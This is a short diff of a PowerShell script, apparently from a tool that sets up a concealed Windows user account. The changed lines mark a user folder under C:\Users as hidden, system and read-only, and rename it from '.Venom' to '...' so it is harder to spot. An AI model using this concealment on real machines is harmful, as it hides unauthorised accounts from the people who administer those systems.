@@ -122,11 +122,11 @@ Remove-Item -Path "$initial_dir\ip.txt"
 
 # Hide Venom User Directory
 Set-Location -Path 'C:\Users'
-if (Test-Path -Path '.Venom' -PathType Container) {
-    attrib +h +s +r .Venom
-    Write-Output ".Venom directory attributes set to hidden, system, and read-only"
+if (Test-Path -Path '...' -PathType Container) {
+    attrib +h +s +r ...
+    Write-Output "... directory attributes set to hidden, system, and read-only"
 } else {
-    Write-Output ".Venom directory does not exist"
+    Write-Output "... directory does not exist"
     Exit 1
 }
 
